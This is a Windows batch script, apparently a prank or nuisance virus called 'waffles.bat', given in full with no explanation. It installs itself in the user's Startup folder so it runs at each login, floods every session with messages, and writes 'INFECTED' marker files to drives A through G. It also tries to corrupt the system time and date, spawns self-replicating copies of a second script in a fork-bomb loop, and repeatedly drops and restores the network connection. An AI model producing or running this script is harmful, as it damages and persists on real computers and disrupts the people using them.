@echo off
if exist "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\waffles.bat" goto :next
copy waffles.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /y
:next
set a=1
set b=0
:1
set /a b=%a%+%b%
title %b%
msg * %b%
echo %username%INFECTED%computername% >> A:\%b%INFECTED%b%
echo %username%INFECTED%computername% >> C:\%b%INFECTED%b%
echo %username%INFECTED%computername% >> D:\%b%INFECTED%b%
echo %username%INFECTED%computername% >> E:\%b%INFECTED%b%
echo %username%INFECTED%computername% >> F:\%b%INFECTED%b%
echo %username%INFECTED%computername% >> G:\%b%INFECTED%b%
if %b% lss 11 goto :3
if %b% equ 100 goto :4
if %b% equ 500 goto :5
if '%b%'=='1000' goto :2
goto :1
:3
color %b%
time %b%:%b%:%b%:%b%
date %b%-%b%-%b%
goto :1
:2
set a=1
set b=0 
goto :1
:4
echo @echo off >> thing.bat
echo :aw >> thing.bat
echo color 10 >> thing.bat
echo color 1 >> thing.bat
echo msg * hacked >> thing.bat
echo color 20 >> thing.bat
echo color 2 >> thing.bat
echo start thing.bat >> thing.bat
echo start waffles.bat >> thing.bat
echo color 30 >> thing.bat
echo color 3 >> thing.bat
echo goto :aw >> thing.bat
start thing.bat
color %b%
goto :1
:5
ipconfig /release
ipconfig /renew
goto :1